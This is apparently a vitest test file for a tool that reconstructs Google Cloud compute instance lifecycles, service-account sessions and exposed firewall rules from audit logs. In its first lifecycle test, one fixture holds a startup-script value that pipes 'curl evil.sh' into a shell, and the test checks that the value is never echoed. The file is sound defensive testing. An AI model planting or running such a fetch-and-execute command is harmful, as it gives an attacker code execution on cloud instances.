// #1066 (931.8 second half, GCP half): the instance compute lifecycle built over one Cloud Audit
// Log upload — the launch facts as the insert's request states them, every later recorded
// operation, a service-account-attachment fact reusing #1065's own decode, calls recorded from
// the attached email while it was recorded as attached, and nothing the records do not say. An
// attached email is never claimed unique to this instance. #1073 adds a narrow firewall join —
// see the "firewall join" describe block below for its own test matrix.
import { describe, expect, it } from "vitest";
import { gcpComputeLifecycles, GCP_COMPUTE_MAX } from "../../src/analysis/gcpCompute.js";
import { parseGcpInstanceResourceName } from "../../src/analysis/gcpComputeState.js";

const PROJECT = "proj-1";
const ZONE = "us-central1-a";
const INST = "vm-1";
const RESOURCE_NAME = `projects/${PROJECT}/zones/${ZONE}/instances/${INST}`;
const T = "2024-05-01T09:00:00Z";
const at = (s: number): string => new Date(Date.parse(T) + s * 1000).toISOString();

const gcp = (method: string, over: Record<string, unknown> = {}): Record<string, unknown> => ({
  protoPayload: {
    methodName: method,
    serviceName: "compute.googleapis.com",
    resourceName: RESOURCE_NAME,
    timestamp: T,
    authenticationInfo: { principalEmail: "alice@example.com" },
    request: {},
    ...over,
  },
});

describe("parseGcpInstanceResourceName", () => {
  it("parses the full documented shape", () => {
    expect(parseGcpInstanceResourceName(RESOURCE_NAME)).toEqual({
      project: PROJECT,
      zone: ZONE,
      instanceName: INST,
    });
  });
  it("returns null for a partial or non-instance resourceName — never guessed", () => {
    expect(parseGcpInstanceResourceName(`projects/${PROJECT}/zones/${ZONE}`)).toBeNull();
    expect(parseGcpInstanceResourceName(`projects/${PROJECT}/global/firewalls/f1`)).toBeNull();
  });
});

describe("gcpComputeLifecycles", () => {
  it("reads the launch facts from the insert request, metadata keys only never values", () => {
    const insert = gcp("v1.compute.instances.insert", {
      request: {
        machineType: "zones/us-central1-a/machineTypes/e2-medium",
        disks: [{ initializeParams: { sourceImage: "projects/debian-cloud/global/images/debian-12" } }],
        networkInterfaces: [
          { network: "global/networks/default", subnetwork: "regions/us-central1/subnetworks/default" },
        ],
        metadata: { items: [{ key: "startup-script", value: "#!/bin/bash\ncurl evil.sh | sh" }] },
      },
    });
    const [row] = gcpComputeLifecycles([insert], "u1");
    expect(row.description).toContain("e2-medium");
    expect(row.description).toContain("debian-12");
    expect(row.description).toContain("startup-script");
    expect(row.description).not.toContain("curl evil.sh");
    expect(row.severity).toBe("Low");
  });

  it("a denied insert (status.code present) is not the launch", () => {
    const insert = gcp("v1.compute.instances.insert", { status: { code: 7 } });
    expect(gcpComputeLifecycles([insert], "u1")).toHaveLength(0);
  });

  it("start/stop/delete are recorded operations, never a fabricated transition", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const start = gcp("v1.compute.instances.start", { timestamp: at(10) });
    const stop = gcp("v1.compute.instances.stop", { timestamp: at(20) });
    const [row] = gcpComputeLifecycles([insert, start, stop], "u1");
    expect(row.description).toContain("recorded: started");
    expect(row.description).toContain("recorded: stopped");
  });

  it("setMetadata is a presence-only fact, never its content", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const setMeta = gcp("v1.compute.instances.setMetadata", {
      timestamp: at(5),
      request: { items: [{ key: "ssh-keys", value: "attacker-key" }] },
    });
    const [row] = gcpComputeLifecycles([insert, setMeta], "u1");
    expect(row.description).toContain("metadata replaced (content not shown)");
    expect(row.description).not.toContain("attacker-key");
  });

  it("instances.setServiceAccount is decoded via #1065's own function — service-account-attached fires", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(5),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const [row] = gcpComputeLifecycles([insert, attach], "u1");
    expect(row.canonical?.gcpCompute?.facts).toContain("service-account-attached");
    expect(row.canonical?.gcpCompute?.attachments).toHaveLength(1);
    expect(row.canonical?.gcpCompute?.attachments[0].email).toBe("sa1@proj-1.iam.gserviceaccount.com");
    expect(row.canonical?.gcpCompute?.attachments[0].to).toBeUndefined();
  });

  it("insert's request.serviceAccounts[].email is ALSO decoded as an attachment (via the same #1065 function)", () => {
    const insert = gcp("v1.compute.instances.insert", {
      timestamp: at(0),
      request: { serviceAccounts: [{ email: "default-sa@proj-1.iam.gserviceaccount.com" }] },
    });
    const [row] = gcpComputeLifecycles([insert], "u1");
    expect(row.canonical?.gcpCompute?.facts).toContain("service-account-attached");
  });

  it("a setServiceAccount with an empty email closes the open interval — detachment, never a new attachment", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(5),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const detach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(10),
      request: { email: "" },
    });
    const [row] = gcpComputeLifecycles([insert, attach, detach], "u1");
    const attachment = row.canonical?.gcpCompute?.attachments[0];
    expect(attachment?.email).toBe("sa1@proj-1.iam.gserviceaccount.com");
    expect(attachment?.to).toBeDefined();
  });

  it("calls recorded from the attached email are tallied as a session, hedged wording", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(5),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const call = {
      protoPayload: {
        methodName: "storage.objects.get",
        serviceName: "storage.googleapis.com",
        timestamp: at(10),
        authenticationInfo: { principalEmail: "sa1@proj-1.iam.gserviceaccount.com" },
      },
    };
    const [row] = gcpComputeLifecycles([insert, attach, call], "u1");
    expect(row.description).toContain("calls recorded from sa1@proj-1.iam.gserviceaccount.com");
    expect(row.description).toContain("this account may be shared with other resources");
    expect(row.canonical?.gcpCompute?.sessions[0].records).toBe(1);
  });

  it("a call from the same email BEFORE attachment or AFTER detachment is never tallied", () => {
    const before = {
      protoPayload: {
        methodName: "storage.objects.get",
        serviceName: "storage.googleapis.com",
        timestamp: at(0),
        authenticationInfo: { principalEmail: "sa1@proj-1.iam.gserviceaccount.com" },
      },
    };
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(5) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(10),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const detach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(15),
      request: { email: "" },
    });
    const after = {
      protoPayload: {
        methodName: "storage.objects.get",
        serviceName: "storage.googleapis.com",
        timestamp: at(20),
        authenticationInfo: { principalEmail: "sa1@proj-1.iam.gserviceaccount.com" },
      },
    };
    const [row] = gcpComputeLifecycles([before, insert, attach, detach, after], "u1");
    expect(row.canonical?.gcpCompute?.sessions).toHaveLength(0);
  });

  it("a High-severity call (GCP_RULES) from the attached email fires session-privileged-change", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(5),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const key = {
      protoPayload: {
        methodName: "google.iam.admin.v1.CreateServiceAccountKey",
        serviceName: "iam.googleapis.com",
        timestamp: at(10),
        authenticationInfo: { principalEmail: "sa1@proj-1.iam.gserviceaccount.com" },
      },
    };
    const [row] = gcpComputeLifecycles([insert, attach, key], "u1");
    expect(row.canonical?.gcpCompute?.facts).toContain("session-privileged-change");
    expect(row.severity).toBe("High");
  });

  it("grades two distinct fact kinds High, one Medium, none Low (insert-only)", () => {
    const insertOnly = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    expect(gcpComputeLifecycles([insertOnly], "u1")[0].severity).toBe("Low");

    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(5),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    expect(gcpComputeLifecycles([insert, attach], "u1")[0].severity).toBe("Medium");
  });

  it("an instance with no insert and fewer than 2 operations and no facts is not reported", () => {
    const start = gcp("v1.compute.instances.start", { timestamp: at(0) });
    expect(gcpComputeLifecycles([start], "u1")).toHaveLength(0);
  });

  it("two instances by resourceName are two separate rows", () => {
    const other = "projects/proj-1/zones/us-central1-a/instances/vm-2";
    const i1 = gcp("v1.compute.instances.insert", { resourceName: RESOURCE_NAME });
    const i2 = gcp("v1.compute.instances.insert", { resourceName: other });
    const rows = gcpComputeLifecycles([i1, i2], "u1");
    expect(rows).toHaveLength(2);
    expect(new Set(rows.map((r) => r.canonical?.gcpCompute?.instanceName))).toEqual(
      new Set(["vm-1", "vm-2"]),
    );
  });

  it("caps rows at GCP_COMPUTE_MAX and reports an omitted row for the rest", () => {
    const records = Array.from({ length: GCP_COMPUTE_MAX + 2 }, (_, i) =>
      gcp("v1.compute.instances.insert", {
        resourceName: `projects/${PROJECT}/zones/${ZONE}/instances/vm-${i}`,
        timestamp: at(i),
      }),
    );
    const rows = gcpComputeLifecycles(records, "u1");
    expect(rows).toHaveLength(GCP_COMPUTE_MAX + 1);
    expect(rows[rows.length - 1].description).toContain("2 further instance");
  });

  // Regression tests for Codex code-round-1 findings (RECOMMENDATION-1066.md).
  it("#1 a DENIED call from the attached email during an open interval is never tallied as a session or a privileged-change fact", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(5),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const denied = {
      protoPayload: {
        methodName: "google.iam.admin.v1.CreateServiceAccountKey",
        serviceName: "iam.googleapis.com",
        timestamp: at(10),
        authenticationInfo: { principalEmail: "sa1@proj-1.iam.gserviceaccount.com" },
        status: { code: 7, message: "PERMISSION_DENIED" },
      },
    };
    const [row] = gcpComputeLifecycles([insert, attach, denied], "u1");
    expect(row.canonical?.gcpCompute?.sessions).toHaveLength(0);
    expect(row.canonical?.gcpCompute?.facts).not.toContain("session-privileged-change");
    expect(row.canonical?.gcpCompute?.attempts.notSucceeded).toBe(1);
    expect(row.severity).toBe("Medium");
  });

  it("#3 mixed-provider evidence: a GCP record's locator is its own index in the ORIGINAL upload, never an Azure record's index", () => {
    // Placed in this file (not cloudActivityImport.test.ts) because it asserts the actual raw
    // locator value the gcpCompute.ts join produced, not just that a row exists.
    const azureRecord = {
      operationName: { value: "Microsoft.Storage/storageAccounts/write" },
      status: { value: "Succeeded" },
    };
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const [row] = gcpComputeLifecycles([azureRecord, insert], "u1");
    expect(row.canonical?.evidence?.rawRecords.map((r) => r.locator)).toContain("record:1");
  });

  it("#4 metadata-replaced is a graded fact, not just an operation line", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const setMeta = gcp("v1.compute.instances.setMetadata", { timestamp: at(5) });
    const [row] = gcpComputeLifecycles([insert, setMeta], "u1");
    expect(row.canonical?.gcpCompute?.facts).toContain("metadata-replaced");
    expect(row.severity).toBe("Medium");
  });

  it("#5 attach -> call -> detach -> reattach same email -> call: two separate sessions, never merged across the gap", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const attach1 = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(5),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const call1 = {
      protoPayload: {
        methodName: "storage.objects.get",
        serviceName: "storage.googleapis.com",
        timestamp: at(10),
        authenticationInfo: { principalEmail: "sa1@proj-1.iam.gserviceaccount.com" },
      },
    };
    const detach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(15),
      request: { email: "" },
    });
    const attach2 = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(20),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const call2 = {
      protoPayload: {
        methodName: "storage.objects.get",
        serviceName: "storage.googleapis.com",
        timestamp: at(25),
        authenticationInfo: { principalEmail: "sa1@proj-1.iam.gserviceaccount.com" },
      },
    };
    const [row] = gcpComputeLifecycles([insert, attach1, call1, detach, attach2, call2], "u1");
    const sessions = row.canonical?.gcpCompute?.sessions ?? [];
    expect(sessions).toHaveLength(2);
    expect(sessions.every((s) => s.records === 1)).toBe(true);
    expect(new Set(sessions.map((s) => s.attachmentFrom)).size).toBe(2);
  });

  it("#6 the privileged-call fact names the specific GCP_RULES check, never the record's final imported severity", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const attach = gcp("v1.compute.instances.setServiceAccount", {
      timestamp: at(5),
      request: { email: "sa1@proj-1.iam.gserviceaccount.com" },
    });
    const key = {
      protoPayload: {
        methodName: "google.iam.admin.v1.CreateServiceAccountKey",
        serviceName: "iam.googleapis.com",
        timestamp: at(10),
        authenticationInfo: { principalEmail: "sa1@proj-1.iam.gserviceaccount.com" },
      },
    };
    const [row] = gcpComputeLifecycles([insert, attach, key], "u1");
    expect(row.description).toContain("GCP_RULES");
    expect(row.description).not.toContain("a High-severity call recorded from the attached service account");
  });

  it("#7 one record cited from two code paths (launch + attachment) counts once toward notCited, never twice", () => {
    const insert = gcp("v1.compute.instances.insert", {
      timestamp: at(0),
      request: { serviceAccounts: [{ email: "default-sa@proj-1.iam.gserviceaccount.com" }] },
    });
    const [row] = gcpComputeLifecycles([insert], "u1");
    expect(row.canonical?.gcpCompute?.notCited).toBe(0);
  });

  it("#2 GCP sessions are capped at the tracked bound; further distinct attached emails' calls are counted, never crash schema validation", () => {
    const insert = gcp("v1.compute.instances.insert", { timestamp: at(0) });
    const records: Record<string, unknown>[] = [insert];
    // 9 distinct attach+call pairs -> 9 distinct sessions would exceed SESSIONS_MAX (8).
    for (let i = 0; i < 9; i++) {
      const email = `sa${i}@proj-1.iam.gserviceaccount.com`;
      records.push(
        gcp("v1.compute.instances.setServiceAccount", { timestamp: at(10 + i * 10), request: { email } }),
      );
      records.push({
        protoPayload: {
          methodName: "storage.objects.get",
          serviceName: "storage.googleapis.com",
          timestamp: at(11 + i * 10),
          authenticationInfo: { principalEmail: email },
        },
      });
    }
    expect(() => gcpComputeLifecycles(records, "u1")).not.toThrow();
    const [row] = gcpComputeLifecycles(records, "u1");
    expect(row.canonical?.gcpCompute?.sessions.length).toBeLessThanOrEqual(8);
    expect(row.canonical?.gcpCompute?.sessionsBeyond).toBeGreaterThan(0);
  });
});

describe("gcpComputeLifecycles — firewall join (#1073)", () => {
  const NETWORK = "global/networks/default";
  const insertWithNetwork = (over: Record<string, unknown> = {}): Record<string, unknown> =>
    gcp("v1.compute.instances.insert", {
      timestamp: at(0),
      request: { networkInterfaces: [{ network: NETWORK }] },
      ...over,
    });
  const firewall = (method: string, request: Record<string, unknown>, over: Record<string, unknown> = {}) =>
    ({
      protoPayload: {
        methodName: method,
        serviceName: "compute.googleapis.com",
        resourceName: `projects/${PROJECT}/global/firewalls/f1`,
        timestamp: at(5),
        authenticationInfo: { principalEmail: "alice@example.com" },
        request,
        ...over,
      },
    }) as Record<string, unknown>;
  const anySourceAllow = (over: Record<string, unknown> = {}): Record<string, unknown> => ({
    network: NETWORK,
    allowed: [{ IPProtocol: "tcp", ports: ["22"] }],
    sourceRanges: ["0.0.0.0/0"],
    ...over,
  });

  it("a matching network-wide insert (no target tags/accounts) allowing 0.0.0.0/0 fires the fact", () => {
    const insert = insertWithNetwork();
    const rule = firewall("v1.compute.firewalls.insert", anySourceAllow());
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).toContain("any-address-firewall-rule");
  });

  it("a rule naming targetTags is targeted, never network-wide — no fact", () => {
    const insert = insertWithNetwork();
    const rule = firewall("v1.compute.firewalls.insert", anySourceAllow({ targetTags: ["web"] }));
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).not.toContain("any-address-firewall-rule");
  });

  it("H1 regression: targetServiceAccounts alone (no targetTags) is still targeted — no fact", () => {
    const insert = insertWithNetwork();
    const rule = firewall(
      "v1.compute.firewalls.insert",
      anySourceAllow({ targetServiceAccounts: ["sa1@proj-1.iam.gserviceaccount.com"] }),
    );
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).not.toContain("any-address-firewall-rule");
  });

  it("firewalls.patch is never read at all, even when it would otherwise match", () => {
    const insert = insertWithNetwork();
    const rule = firewall("v1.compute.firewalls.patch", anySourceAllow());
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).not.toContain("any-address-firewall-rule");
  });

  it("a rule that denies a matching source is never an allow — no fact", () => {
    const insert = insertWithNetwork();
    const rule = firewall(
      "v1.compute.firewalls.insert",
      anySourceAllow({ allowed: undefined, denied: [{ IPProtocol: "all" }] }),
    );
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).not.toContain("any-address-firewall-rule");
  });

  it("a disabled rule is never a fact", () => {
    const insert = insertWithNetwork();
    const rule = firewall("v1.compute.firewalls.insert", anySourceAllow({ disabled: true }));
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).not.toContain("any-address-firewall-rule");
  });

  it("a rule on a different network never joins", () => {
    const insert = insertWithNetwork();
    const rule = firewall(
      "v1.compute.firewalls.insert",
      anySourceAllow({ network: "global/networks/other" }),
    );
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).not.toContain("any-address-firewall-rule");
  });

  it("a Shared-VPC-shaped project-token mismatch does not join — a stated limitation, not a resolved case", () => {
    const insert = insertWithNetwork({
      request: {
        networkInterfaces: [{ network: "projects/service-proj/global/networks/shared" }],
      },
    });
    const rule = firewall(
      "v1.compute.firewalls.insert",
      anySourceAllow({ network: "projects/host-proj/global/networks/shared" }),
    );
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).not.toContain("any-address-firewall-rule");
  });

  it("an ::/0 source range also fires the fact", () => {
    const insert = insertWithNetwork();
    const rule = firewall(
      "v1.compute.firewalls.update",
      anySourceAllow({ sourceRanges: ["::/0"] }),
    );
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).toContain("any-address-firewall-rule");
  });

  it("a source range that is not 0.0.0.0/0 or ::/0 does not fire the fact", () => {
    const insert = insertWithNetwork();
    const rule = firewall(
      "v1.compute.firewalls.insert",
      anySourceAllow({ sourceRanges: ["10.0.0.0/8"] }),
    );
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).not.toContain("any-address-firewall-rule");
  });

  it("the API-URL prefix is stripped from both sides before the literal comparison", () => {
    const insert = insertWithNetwork({
      request: {
        networkInterfaces: [
          { network: "https://www.googleapis.com/compute/v1/projects/proj-1/global/networks/default" },
        ],
      },
    });
    const rule = firewall("v1.compute.firewalls.insert", anySourceAllow({ network: NETWORK }));
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).toContain("any-address-firewall-rule");
  });

  it("H2 regression: a bare network reference is resolved against the RECORD'S OWN project — two projects' identically-named networks never collide", () => {
    const insert = insertWithNetwork(); // instance's own project is proj-1, network "global/networks/default"
    const otherProjectRule = {
      protoPayload: {
        methodName: "v1.compute.firewalls.insert",
        serviceName: "compute.googleapis.com",
        resourceName: "projects/proj-2/global/firewalls/f1",
        timestamp: at(5),
        authenticationInfo: { principalEmail: "alice@example.com" },
        request: anySourceAllow(), // network: "global/networks/default", relative to proj-2
      },
    };
    const [row] = gcpComputeLifecycles([insert, otherProjectRule], "u1");
    expect(row.canonical?.gcpCompute?.facts).not.toContain("any-address-firewall-rule");
  });

  it("H2: a bare network reference DOES join a rule recorded in the instance's OWN project", () => {
    const insert = insertWithNetwork();
    const sameProjectRule = firewall("v1.compute.firewalls.insert", anySourceAllow());
    const [row] = gcpComputeLifecycles([insert, sameProjectRule], "u1");
    expect(row.canonical?.gcpCompute?.facts).toContain("any-address-firewall-rule");
  });

  it("firewalls.insert with a resourceName that does not parse to the documented firewall shape is never read", () => {
    const insert = insertWithNetwork();
    const rule = firewall("v1.compute.firewalls.insert", anySourceAllow(), {
      resourceName: "not-a-firewall-resource-name",
    });
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).not.toContain("any-address-firewall-rule");
  });

  it("H1: the allow/deny arrays are read under either the singular or pluralized field spelling", () => {
    const insert = insertWithNetwork();
    const rule = firewall("v1.compute.firewalls.insert", {
      network: NETWORK,
      alloweds: [{ IPProtocol: "tcp", ports: ["22"] }],
      sourceRanges: ["0.0.0.0/0"],
    });
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).toContain("any-address-firewall-rule");
  });

  it("H1: a pluralized denieds array still blocks the fact", () => {
    const insert = insertWithNetwork();
    const rule = firewall("v1.compute.firewalls.insert", {
      network: NETWORK,
      denieds: [{ IPProtocol: "all" }],
      sourceRanges: ["0.0.0.0/0"],
    });
    const [row] = gcpComputeLifecycles([insert, rule], "u1");
    expect(row.canonical?.gcpCompute?.facts).not.toContain("any-address-firewall-rule");
  });
});
